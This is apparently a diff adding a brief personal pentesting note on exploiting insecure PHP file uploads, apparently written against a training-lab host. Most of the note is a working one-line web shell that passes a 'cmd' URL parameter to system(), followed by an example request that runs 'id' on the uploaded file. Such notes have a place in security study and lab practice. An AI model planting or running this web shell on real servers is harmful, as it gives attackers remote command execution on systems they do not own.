@@ -1,0 +1,16 @@
+Author: Pawel Werner
+e-mail: pawel.k.werner@gmail.com
+linkedin: https://www.linkedin.com/in/pawe%C5%82-werner-31b40a53/
+
+*************** PHP - file UPLOAD ***************
+
+1.If we can upload PHP file:
+
+a. Create a file with php function (for e.g. cmd):
+
+<?php
+  system($_GET["cmd"]);
+?>
+
+2. Run the url with cmd, for e.g.:
+http://ptl-f04cf96b-a06904be.libcurl.so/upload/upload.php?cmd=id
